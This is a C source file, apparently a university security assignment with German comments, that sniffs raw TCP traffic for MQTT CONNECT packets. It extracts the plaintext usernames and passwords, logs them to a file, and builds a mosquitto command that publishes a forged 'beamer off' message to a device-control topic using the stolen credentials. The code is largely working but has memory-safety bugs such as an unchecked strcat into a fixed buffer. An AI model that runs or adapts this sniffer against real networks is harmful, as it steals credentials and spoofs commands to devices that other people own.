#include<stdio.h> //For standard things
#include<stdlib.h>    //malloc
#include<string.h>    //memset
#include<sys/socket.h>
#include<arpa/inet.h>
#include <fcntl.h> // for open
#include <unistd.h> // for close
#include "PA2.h"
 
int forward_packet(unsigned char* , int); 
int filter_remaining_length(unsigned char* , int);
int filter_connect_packet(unsigned char* , int);
int filter_protocol_name(unsigned char* , int,int,int);
int filter_connect_flags(unsigned char* , int,int,int);
int filter_client_identifier(unsigned char* , int,int,int);
int filter_user_name(unsigned char* , int,int,int);
int filter_password(unsigned char* , int,int,int);
int get_field(unsigned char*, char**, int);
 
int sock_raw; // erstelle unseren socket den Wir brauchen
int password_found = 0; // boolean ob wir ein passendes Passwort gefunden haben
FILE *logfile; // logfile für ausgaben
int tcp=0,others=0,total=0,i,j;

char* user_name; //Saved Username
char* password;  //Saved Password

struct sockaddr_in source,dest; //erstelle Sockadress
 
int main(int argc, char **argv){ 
    int saddr_size , data_size;
    struct sockaddr saddr;
    struct in_addr in;
     
    unsigned char *buffer = (unsigned char *)malloc(65536); //Its Big!
     
    logfile=fopen("log.txt","w");
    if(logfile==NULL) printf("Unable to create file.");
    printf("Starting...\n");
    fprintf(logfile,"\n\n***********************Log File*************************\n");   
    //Create a raw socket that shall sniff
    sock_raw = socket(AF_INET , SOCK_RAW , IPPROTO_TCP);
    if(sock_raw < 0)
    {
        printf("Socket Error\n");
        return 1;
    }
    while(!password_found)
    {
        saddr_size = sizeof saddr;
        //Receive a packet
        data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , &saddr_size);
        if(data_size <0 )
        {
            printf("Recvfrom error , failed to get packets\n");
            return -1;
        }
        //Now process the packet
        forward_packet(buffer , data_size);
    }
    close(sock_raw);
    free(buffer);
     
     
    printf("Finished");
    return 0;
}
 
/**
* Erhählt das gesammte Packet und filtert zunächst das TCP Packet raus
*/
int forward_packet(unsigned char* buffer, int size)
{
    //Get the IP Header part of this packet
    struct iphdr *iph = (struct iphdr*)buffer;
    switch (iph->protocol) //Check the Protocol and do accordingly...
    {
        case 6: //Case 6 ist TCP
            //Okay wir haben nun ein TCP Packet gefunden
            filter_connect_packet(buffer , size);
            break;
        default: 
            break;
    }
 
  return 0;
}

/**
* Erzählt einen Buffer der ein TCP Packet ist
*/
int filter_connect_packet(unsigned char* Buffer, int Size)
{
    struct iphdr* iph; // erstellen des IP Header
    struct tcphdr* tcph; //erstellen des TCP Header
 
    //Wir holen uns das Gesammte Payload Packer (inlc. Fixed Header, Variable Header, etc.)
    char* data_payload = get_tcp_payload(Buffer,&iph ,&tcph ); //Aufruf der Helper Funktion
 
    char mqtt_packet_type = data_payload[0] & 0xF0; //MQTT Packet Typ ist von Bit 7-4 definiert --> Filtern dieser Bits
    int is_connect_packet = mqtt_packet_type==16; // Wenn Bit 4 eine 1 ist ist es ein CONNECT Packet --> 0001000 = 16
 
    if(is_connect_packet){
       //printf("Found a Connect Packet !\n");
       //Super wir haben ein CONNECT Packet gefunden und verarbeiten dies nun weiter
       return filter_remaining_length(data_payload,Size);
    }
    else{
       return 0;
    }
}
 
/**
* Überstpringe die Remaining Length
*/
int filter_remaining_length(unsigned char* data_payload, int Size)
{
    int pos = 1;
    int multiplier = 1;
    int remaining_length = 0;
 
    remaining_length = data_payload[pos];
    
 
    pos++; //Das erste Byte beginnt erst nach dem Control Packet Type
    
    //Leicht abgewandter Code von
    // 2.2.3 Remaining Length
    //http://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html
    char encodedByte = data_payload[pos];
    while((encodedByte & 128) != 0){
      remaining_length += (encodedByte & 127) * multiplier;
      multiplier *= 128;
      if (multiplier > 128*128*128){
          printf("Error: Remaining Length is not valid!");
          return -1;
      }
     
      pos++; //Falls die Remaining Length über mehrere Byte lang ist, überspringen wir diese
      encodedByte = data_payload[pos];
    }
    //Ende des abgewandten Codes
 
    fprintf(logfile,"\n\n***********************Connect Packet*************************\n");    
    fprintf(logfile,"Remaining Length: %d\n",remaining_length);  
 
    //Okay wir stehen nun auf dem Protocol Name
    filter_protocol_name(data_payload, Size, remaining_length, pos);
 
    fprintf(logfile,"\n###########################################################"); 
 
     return 0;
}

/**
* Ließt ein Field aus und gibt dabei den pos Zeiger aus, für das nächste Feld,
* In field wird der Inhalt des Fields koopiert, und endet mit \0
* field muss dabei später gefreed werden
*/
int get_field(unsigned char* data_payload, char** field, int pos){ 
 pos++; // skip MSB
 int length_field = data_payload[pos];
 //fprintf(logfile,"LSB: %d\n",length_field);
 pos++;
 
 // Erstelle zwischen Speicher mit platz für \0
 char* temp = malloc(sizeof(char)*length_field+1);
 
 int i;
 //laufe das arraydurch
 for(i=0;i<length_field;i++){
  temp[i] = data_payload[pos];
  fprintf(logfile,"%c",temp[i]);
  pos++;
 }
 //setze ende des Strings
 temp[length_field] = '\0';
 
 //stelle verknüpfung her
 *field = temp;
 
 //Gebe neue position zurück
 return pos;
}
 

/**
* Finde den Protokollnamen heraus und fahre dann fort wenn dieser passt
*/
int filter_protocol_name(unsigned char* data_payload, int Size, int remaining_length, int pos ){
 fprintf(logfile,"Protocol Name: ");  
 char* protocol_name;
 //Lese Protocolname field aus
 pos = get_field(data_payload,&protocol_name,pos);  
 
 fprintf(logfile,"\n");  
 
 //Setze erlaubte Namen
 int is_mqtt = strcmp(protocol_name,"MQTT");
 int is_mqisdp = strcmp(protocol_name,"MQIsdp");
 
 free(protocol_name);
 
 //Prüfe ob erlaubter name vorkam
 if(is_mqtt || is_mqisdp){
  
  //fprintf(logfile,"Protocol Level: %d\n",(int)data_payload[pos]);
  pos++; // skip Protocol Level
  
  //Cool wir haben das richtige Protokoll gefunden auf zu den flags
  filter_connect_flags(data_payload, Size, remaining_length, pos);
 }
 
 
 return 0;
}

/**
* Convert Helper Function um ein Int zum Binary anzuzeigen, just for fun
* http://stackoverflow.com/questions/5488377/converting-an-integer-to-binary-in-c
*/
unsigned int int_to_int(unsigned int k) {
    return (k == 0 || k == 1 ? k : ((k % 2) + 10 * int_to_int(k / 2)));
}

/**
* Filtere die Flags heraus und schau ob wir Username und Passwort mitgesendet bekommen haben
*/
int filter_connect_flags(unsigned char* data_payload, int Size, int remaining_length, int pos ){
 //pos stands now on connect flags
 fprintf(logfile,"Connect Flags: %d\n",int_to_int(data_payload[pos]));
 
 //Setzte ob wir unsere Flags gefunden habenm je nachdem wo die Bits stehen
 int is_user_name_flag = (data_payload[pos] & 0x80)==128;
 int is_password_flag = (data_payload[pos] & 0x40)==64;
 
 fprintf(logfile,"-- User Name Flag: %d\n",is_user_name_flag);
 fprintf(logfile,"-- Password Flag: %d\n",is_password_flag);
 pos++; // forward to keep alive
 
 pos++; //skip keep alive MSB
 pos++; //skip keep alive LSB
 
 //pos stands now on MSB of next Flag whatever this is
 
 //Skippe den client identifier
 pos = filter_client_identifier(data_payload, Size, remaining_length, pos);
 
 //nur wenn wir beides erhalten haben fahre fort( username und password)
 if(is_user_name_flag && is_password_flag){
  //Andere Flags müssen wir nicht berücksichtigen (siehe aufgabe)
  
  //Okay schauen wir nach welcher Username vorhanden ist
  pos = filter_user_name(data_payload, Size, remaining_length, pos);
  //Nach dem Username kommt das Password
  pos = filter_password(data_payload, Size, remaining_length, pos);
 }
 
 printf("\n\nSende gefälschte Nachricht los!");
 
 //TODO hier gefälschte nachricht absenden
 char cmd[] = "mosquitto pub -m \"beamer off\" -t \"/uos/93/E06/beamer-control\" -u ";
 strcat(cmd,user_name);
 strcat(cmd," -P ");
 strcat(cmd,password);
 //printf("Running Command: %s\n",cmd);
 //system(cmd);
 printf("\n\n");
 
 
 //Wir brauchen diese nun nicht mehr
 free(user_name);
 free(password);
 
 return 0;
}


/**
* Unnötiger Client Identifier, steht uns nunmal im weg
*/
int filter_client_identifier(unsigned char* data_payload, int Size, int remaining_length, int pos ){
  
 //fprintf(logfile,"Client Identifier MSB : %d\n",data_payload[pos]);  
 fprintf(logfile,"Client Identifier: ");  
 char* identifier;
 pos = get_field(data_payload,&identifier,pos);
  
 fprintf(logfile,"\n");  
 
 free(identifier);
 
 return pos;
}

/**
* So hier gehts an die Wurst, wir müssen nun den Username auslesen
*/
int filter_user_name(unsigned char* data_payload, int Size, int remaining_length, int pos ){
  
  //fprintf(logfile,"User Name MSB : %d\n",data_payload[pos]);  
  fprintf(logfile,"User Name: ");  
  
  //Fülle das field User_name
  pos = get_field(data_payload,&user_name,pos);
  
  fprintf(logfile,"\n");  
 return pos;
}

/**
* Safe das Passwort als Plaintext zu senden, wir freuen uns
*/
int filter_password(unsigned char* data_payload, int Size, int remaining_length, int pos ){
 //fprintf(logfile,"Password MSB : %d\n",data_payload[pos]); 
 fprintf(logfile,"Password: ");  
  
   //Fülle das field Password
  pos = get_field(data_payload,&password,pos);
  
  fprintf(logfile,"\n");  
 return pos;
}
